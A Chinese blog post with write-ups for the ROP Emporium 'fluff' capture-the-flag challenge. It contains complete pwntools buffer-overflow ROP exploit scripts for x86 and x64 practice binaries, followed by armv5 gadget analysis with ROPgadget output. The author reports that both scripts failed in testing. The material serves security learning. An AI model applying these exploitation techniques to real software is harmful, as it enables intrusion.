<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/my_ico.ico">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/my_ico.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/my_ico.ico">
  <link rel="mask-icon" href="/images/my_ico.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
  </script>

  <meta name="description" content="这是对之前 ROP Emporium 只写了部分答案进行续写。 fluff 这道题的考点在于无法直接使用常用的代码构造pop链，需要详细了解指令集的各类具体指令，综合利用其他非常用类型指令构造合适的pop链将字符串写入data段，再跳转到print_file函数运行。 x86和x64 这里仅给出exp，具体分析见此文章，内容比较详细，不再重复讲解。">
<meta property="og:type" content="article">
<meta property="og:title" content="rop emporium 续">
<meta property="og:url" content="http://example.com/2022/10/24/rop-emporium-%E7%BB%AD/index.html">
<meta property="og:site_name" content="lylanfree&#39;s blog">
<meta property="og:description" content="这是对之前 ROP Emporium 只写了部分答案进行续写。 fluff 这道题的考点在于无法直接使用常用的代码构造pop链，需要详细了解指令集的各类具体指令，综合利用其他非常用类型指令构造合适的pop链将字符串写入data段，再跳转到print_file函数运行。 x86和x64 这里仅给出exp，具体分析见此文章，内容比较详细，不再重复讲解。">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2022-10-24T15:08:08.000Z">
<meta property="article:modified_time" content="2022-11-24T14:07:34.227Z">
<meta property="article:author" content="lylanfree">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="rop">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/2022/10/24/rop-emporium-%E7%BB%AD/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>rop emporium 续 | lylanfree's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --></head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">lylanfree's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/24/rop-emporium-%E7%BB%AD/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="lylanfree">
      <meta itemprop="description" content="持续学习的程序员">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lylanfree's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          rop emporium 续
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-10-24 23:08:08" itemprop="dateCreated datePublished" datetime="2022-10-24T23:08:08+08:00">2022-10-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-11-24 22:07:34" itemprop="dateModified" datetime="2022-11-24T22:07:34+08:00">2022-11-24</time>
              </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span><br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>36k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>33 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>这是对之前 <a href="/2022/09/27/rop-emporium/" title="rop emporium">ROP Emporium</a> 只写了部分答案进行续写。</p>
<h2 id="fluff">fluff</h2>
<p>这道题的考点在于无法直接使用常用的代码构造pop链，需要详细了解指令集的各类具体指令，综合利用其他非常用类型指令构造合适的pop链将字符串写入data段，再跳转到print_file函数运行。</p>
<h3 id="x86和x64">x86和x64</h3>
<p>这里仅给出exp，具体分析见此<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-272054.htm">文章</a>，内容比较详细，不再重复讲解。</p>
<span id="more"></span>
<ol type="1">
<li><p>x86</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line">context.bits = <span class="number">32</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getio</span>(<span class="params">program</span>):</span><br><span class="line">    io = process(program)</span><br><span class="line">    <span class="comment"># io = gdb.debug([program], &quot;b *0x80483d0&quot;)</span></span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getMask</span>(<span class="params">nValue, nOutput</span>):</span><br><span class="line">    <span class="comment"># nOutput = pext(nValue, nMask)</span></span><br><span class="line">    <span class="comment"># eg.</span></span><br><span class="line">    <span class="comment">#   nValue = 0xFF</span></span><br><span class="line">    <span class="comment">#   nMask = 0xF4</span></span><br><span class="line">    <span class="comment">#   -&gt;</span></span><br><span class="line">    <span class="comment">#   nOutput = 0x1F</span></span><br><span class="line"> </span><br><span class="line">    nMask = <span class="number">0</span></span><br><span class="line">    nLastBitFoundInValue = <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># find the highest valid bit</span></span><br><span class="line">    nInvalidBits = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):  <span class="comment"># ascii</span></span><br><span class="line">        <span class="keyword">if</span> (nOutput &amp; (<span class="number">1</span> &lt;&lt; i)) != <span class="number">0</span>:</span><br><span class="line">            nInvalidBits = i</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nInvalidBits + <span class="number">1</span>): </span><br><span class="line">        <span class="keyword">while</span> (nOutput &amp; <span class="number">1</span>) != (nValue &amp; <span class="number">1</span>):</span><br><span class="line">            nLastBitFoundInValue += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> nLastBitFoundInValue == <span class="number">33</span>:  <span class="comment"># 4 Bytes</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            nValue = nValue &gt;&gt; <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment"># found</span></span><br><span class="line">        nOutput = nOutput &gt;&gt; <span class="number">1</span></span><br><span class="line">        nValue = nValue &gt;&gt; <span class="number">1</span></span><br><span class="line">        nMask |= <span class="number">1</span> &lt;&lt; (nLastBitFoundInValue - <span class="number">1</span>)</span><br><span class="line">        nLastBitFoundInValue += <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> nMask</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nBufOverflowIndex = <span class="number">44</span></span><br><span class="line">pPltPrintFile = <span class="number">0x080483D0</span></span><br><span class="line">pDataSection = <span class="number">0x0804A018</span></span><br><span class="line">pGadgetPopEcx_bswap = <span class="number">0x08048558</span>    <span class="comment"># pop ecx ; bswap ecx ; ret</span></span><br><span class="line">pGadgetPopEbp = <span class="number">0x080485bb</span>          <span class="comment"># pop ebp ; ret</span></span><br><span class="line">pGadgetPext = <span class="number">0x08048543</span>            <span class="comment"># mov eax,ebp;mov ebx,0xb0bababa; pext edx,ebx,eax</span></span><br><span class="line">pGadgetXchg = <span class="number">0x08048555</span>            <span class="comment"># xchg byte ptr [ecx], dl ; ret   把字符写入.data</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. padding</span></span><br><span class="line">payload = <span class="built_in">bytes</span>(<span class="string">&quot;C&quot;</span> * nBufOverflowIndex, encoding = <span class="string">&quot;ascii&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># payload += p32(pPltPrintFile) </span></span><br><span class="line"><span class="comment"># 2. Loop</span></span><br><span class="line">strEdx = <span class="string">&quot;flag.txt&quot;</span></span><br><span class="line">nValue = <span class="number">0xb0bababa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(strEdx)):</span><br><span class="line">    nMask = getMask(nValue, <span class="built_in">ord</span>(strEdx[i]))</span><br><span class="line">    <span class="comment"># print(hex(nMask))</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 2.1 write .data addr into ecx</span></span><br><span class="line">    payload += p32(pGadgetPopEcx_bswap)        <span class="comment"># 0x08048558 : pop ecx ; bswap ecx ; ret</span></span><br><span class="line">    payload += p32(pDataSection + i, endianness=<span class="string">&quot;big&quot;</span>)        <span class="comment"># Big Endian    pop to ecx</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 2.2 write nMask into ebp</span></span><br><span class="line">    payload += p32(pGadgetPopEbp)        <span class="comment"># 0x080485bb : pop ebp ; ret</span></span><br><span class="line">    payload += p32(nMask)                <span class="comment"># getMask(&quot;flag.txt&quot;[i])    pop to ebp</span></span><br><span class="line">    payload += p32(pGadgetPext)            <span class="comment"># 0x08048543 : mov eax,ebp;mov ebx,0xb0bababa; pext edx,ebx,eax</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 2.3 write &quot;flag.txt&quot; into .data</span></span><br><span class="line">    payload += p32(pGadgetXchg)            <span class="comment"># 0x08048555 : xchg byte ptr [ecx], dl ; ret   把字符写入.data</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 3. print_file(&quot;flag.txt&quot;)</span></span><br><span class="line">payload += p32(pPltPrintFile)            <span class="comment"># 0x080483d0</span></span><br><span class="line">payload += p32(<span class="number">0x080483B0</span>)                <span class="comment"># 伪造的返回地址</span></span><br><span class="line">payload += p32(pDataSection)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">io = getio(<span class="string">&quot;./fluff32&quot;</span>)</span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># failed with unknown reason, when it runs in print_file-&gt;fopen-&gt;, it failed.</span></span><br></pre></td></tr></table></figure></li>
<li><p>x64</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.bits = <span class="number">64</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getio</span>(<span class="params">program</span>):</span><br><span class="line">    io = process(program)</span><br><span class="line">    <span class="comment"># io = gdb.debug([program], &quot;b main&quot;)</span></span><br><span class="line">    <span class="keyword">return</span> io;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">nBufOverflowIndex = <span class="number">0x28</span></span><br><span class="line">pPltPrintFile = <span class="number">0x0000000000400510</span></span><br><span class="line">pGadgetBextrToSetRbx = <span class="number">0x40062a</span>     <span class="comment"># pop rdx;</span></span><br><span class="line">                                    <span class="comment"># pop rcx;</span></span><br><span class="line">                                    <span class="comment"># add rcx, 0x3ef2;</span></span><br><span class="line">                                    <span class="comment"># bextr rbx, rcx, rdx;</span></span><br><span class="line">                                    <span class="comment"># ret;  </span></span><br><span class="line">                                    <span class="comment"># 满足[rbx+al]这个地址存有目标字符，可以用SetRbxToAddr函数实现</span></span><br><span class="line">pGadgetXlatToSetAl = <span class="number">0x400628</span>       <span class="comment"># xlat   BYTE PTR ds:[rbx]; --&gt; al = [rbx+al]</span></span><br><span class="line">                                    <span class="comment"># al保存目标字节，比如&quot;f&quot;， 可以用SetAlToByte函数实现</span></span><br><span class="line">pGadgetPopRdi = <span class="number">0x00000000004006a3</span>  <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pGadgetStos = <span class="number">0x400639</span>              <span class="comment"># stos   BYTE PTR es:[rdi],al  往.data逐字节写入字符串&quot;flag.txt&quot;</span></span><br><span class="line">pDataSection = <span class="number">0x0000000000601028</span>   <span class="comment"># .data地址</span></span><br><span class="line">g_byRealTimeAlWhenFirstXlat = <span class="number">0xb</span>   <span class="comment"># 和xlat指令有关这里需要调试一下，看当时的al值为多少</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setRbxToAddr</span>(<span class="params">pTargetAddr, rop</span>):</span><br><span class="line">    rdx = ((<span class="number">2</span>**<span class="number">6</span>)&lt;&lt;<span class="number">8</span>) | <span class="number">0x00</span>    <span class="comment"># rcx: start 0, len 64</span></span><br><span class="line">    rcx = pTargetAddr</span><br><span class="line">    rop.raw(pGadgetBextrToSetRbx)</span><br><span class="line">    rop.raw(rdx)</span><br><span class="line">    rop.raw(rcx - <span class="number">0x3ef2</span>)      <span class="comment"># add rcx, 0x3ef2;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setAlToByte</span>(<span class="params">byTarget, rop, elf, byRealTimeAl</span>):</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 2.1 set rbx to addr</span></span><br><span class="line">    pTargetByteAddr = <span class="built_in">next</span>(elf.search(byTarget))</span><br><span class="line">    pTargetRbx = pTargetByteAddr - byRealTimeAl</span><br><span class="line">    setRbxToAddr(pTargetRbx, rop)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 2.2 set al to the byte of &quot;flag.txt&quot;</span></span><br><span class="line">    rop.raw(pGadgetXlatToSetAl)     <span class="comment"># xlat   BYTE PTR ds:[rbx]; --&gt; al = [rbx+al]</span></span><br><span class="line"> </span><br><span class="line">program = <span class="string">&quot;./fluff&quot;</span></span><br><span class="line">io = getio(program)</span><br><span class="line">elf = ELF(program)</span><br><span class="line">rop = ROP(program)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 1. buf overflow </span></span><br><span class="line">padding = <span class="string">b&quot;A&quot;</span> * nBufOverflowIndex</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 2. write &quot;flag.txt&quot; into .data section</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 2.1 rdi not used later</span></span><br><span class="line">rop.raw(pGadgetPopRdi)</span><br><span class="line">rop.raw(pDataSection)</span><br><span class="line"> </span><br><span class="line">strFlagTxt = <span class="string">&quot;flag.txt&quot;</span></span><br><span class="line">byRealTimeAl = g_byRealTimeAlWhenFirstXlat  <span class="comment"># al的初始值</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> strFlagTxt:</span><br><span class="line">    setAlToByte(c, rop, elf, byRealTimeAl)</span><br><span class="line">    byRealTimeAl = <span class="built_in">ord</span>(c)    <span class="comment"># 更新al</span></span><br><span class="line">    rop.raw(pGadgetStos) </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 4. print_file(&quot;flag.txt&quot;)</span></span><br><span class="line">rop.raw(pGadgetPopRdi)</span><br><span class="line">rop.raw(pDataSection)</span><br><span class="line">rop.raw(pPltPrintFile)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&quot;&quot;</span>.join([</span><br><span class="line">    padding,</span><br><span class="line">    rop.chain()</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"> </span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(io.recv(timeout=<span class="number">10</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li>
</ol>
<blockquote>
<p>值得注意的是，上述代码在本地ubuntu主机测试运行时，发生错误，无法获取flag，经过pwndbg调试发现已经成功将<code>flag.txt</code>字符串写入data段内，但在后续调用<code>print_file</code>函数时，进入<code>fopen</code>函数后产生错误。</p>
</blockquote>
<h3 id="armv5">armv5</h3>
<p>考点：联合使用常规arm指令和thumb指令构造pop链，进行数据写入。</p>
<h4 id="分析">分析</h4>
<p>通过初步观察，未发现 <strong>sw</strong> 指令，无法直接将数据写入data段内，但代码中存在 <strong>bx</strong> 指令，该指令可以在 arm指令集和thumb指令集之间进行跳转，因此猜测可能需要利用thumb指令集才可以写入数据。</p>
<p>首先查看gadget，可以看到如下指令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:000105EC                               questionableGadgets</span><br><span class="line">.text:000105EC 0B 00 BD E8                   POP     &#123;R0,R1,R3&#125;</span><br><span class="line">.text:000105F0 11 FF 2F E1                   BX      R1</span><br></pre></td></tr></table></figure>
<p>在返回地址覆盖指令地址<code>0x000105EC</code>可以将栈数据写入 <em>R0</em>, <em>R1</em>, <em>R3</em> 寄存器中，但ARM指令中没有相关<strong>SW</strong>指令，因此搜索thumb指令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary fluff_armv5 --thumb</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000105f2 : b #0x10854 ; movs r0, r0 ; b #0x1093a ; movs r0, r0 ; b #0x1093e ; movs r0, r0 ; b #0x10942 ; movs r0, r0 ; b #0x10946 ; blx lr</span><br><span class="line">0x000105f6 : b #0x1093a ; movs r0, r0 ; b #0x1093e ; movs r0, r0 ; b #0x10942 ; movs r0, r0 ; b #0x10946 ; blx lr</span><br><span class="line">0x000105fa : b #0x1093e ; movs r0, r0 ; b #0x10942 ; movs r0, r0 ; b #0x10946 ; blx lr</span><br><span class="line">0x000105fe : b #0x10942 ; movs r0, r0 ; b #0x10946 ; blx lr</span><br><span class="line">0x00010602 : b #0x10946 ; blx lr</span><br><span class="line">0x00010604 : blx lr</span><br><span class="line">0x000103ec : bx r0</span><br><span class="line">0x000103da : ldr r5, [r4, #0x64] ; ldrsh r4, [r4, r5] ; lsls r7, r3, #1 ; ldrsh r7, [r3, r5] ; ldr r5, [r4, #0x64] ; ldrsh r4, [r4, r5] ; lsls r7, r3, #1 ; str r7, [r3, #0x54] ; str r6, [r5, #0x44] ; bx r0</span><br><span class="line">0x000103e2 : ldr r5, [r4, #0x64] ; ldrsh r4, [r4, r5] ; lsls r7, r3, #1 ; str r7, [r3, #0x54] ; str r6, [r5, #0x44] ; bx r0</span><br><span class="line">0x000103dc : ldrsh r4, [r4, r5] ; lsls r7, r3, #1 ; ldrsh r7, [r3, r5] ; ldr r5, [r4, #0x64] ; ldrsh r4, [r4, r5] ; lsls r7, r3, #1 ; str r7, [r3, #0x54] ; str r6, [r5, #0x44] ; bx r0</span><br><span class="line">0x000103e4 : ldrsh r4, [r4, r5] ; lsls r7, r3, #1 ; str r7, [r3, #0x54] ; str r6, [r5, #0x44] ; bx r0</span><br><span class="line">0x000103e0 : ldrsh r7, [r3, r5] ; ldr r5, [r4, #0x64] ; ldrsh r4, [r4, r5] ; lsls r7, r3, #1 ; str r7, [r3, #0x54] ; str r6, [r5, #0x44] ; bx r0</span><br><span class="line">0x000103de : lsls r7, r3, #1 ; ldrsh r7, [r3, r5] ; ldr r5, [r4, #0x64] ; ldrsh r4, [r4, r5] ; lsls r7, r3, #1 ; str r7, [r3, #0x54] ; str r6, [r5, #0x44] ; bx r0</span><br><span class="line">0x000103e6 : lsls r7, r3, #1 ; str r7, [r3, #0x54] ; str r6, [r5, #0x44] ; bx r0</span><br><span class="line">0x000105f4 : movs r0, r0 ; b #0x1093a ; movs r0, r0 ; b #0x1093e ; movs r0, r0 ; b #0x10942 ; movs r0, r0 ; b #0x10946 ; blx lr</span><br><span class="line">0x000105f8 : movs r0, r0 ; b #0x1093e ; movs r0, r0 ; b #0x10942 ; movs r0, r0 ; b #0x10946 ; blx lr</span><br><span class="line">0x000105fc : movs r0, r0 ; b #0x10942 ; movs r0, r0 ; b #0x10946 ; blx lr</span><br><span class="line">0x00010600 : movs r0, r0 ; b #0x10946 ; blx lr</span><br><span class="line">0x000103ea : str r6, [r5, #0x44] ; bx r0</span><br><span class="line">0x000103e8 : str r7, [r3, #0x54] ; str r6, [r5, #0x44] ; bx r0</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 20</span><br></pre></td></tr></table></figure>
